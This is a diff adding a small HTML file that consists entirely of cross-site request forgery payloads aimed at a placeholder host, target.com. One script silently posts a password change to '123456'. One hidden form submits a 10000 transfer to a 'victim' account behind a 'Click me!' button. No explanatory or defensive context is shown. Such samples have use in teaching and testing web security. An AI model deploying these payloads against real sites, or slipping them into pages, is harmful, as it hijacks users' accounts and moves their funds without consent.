@@ -1,0 +1,11 @@
+<script>
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", "http://target.com/change_password", true);
+  xhr.send("newpassword=123456");
+</script>
+
+<form action="http://target.com/transfer" method="POST">
+  <input type="hidden" name="amount" value="10000">
+  <input type="hidden" name="to_account" value="victim">
+  <input type="submit" value="Click me!">
+</form>
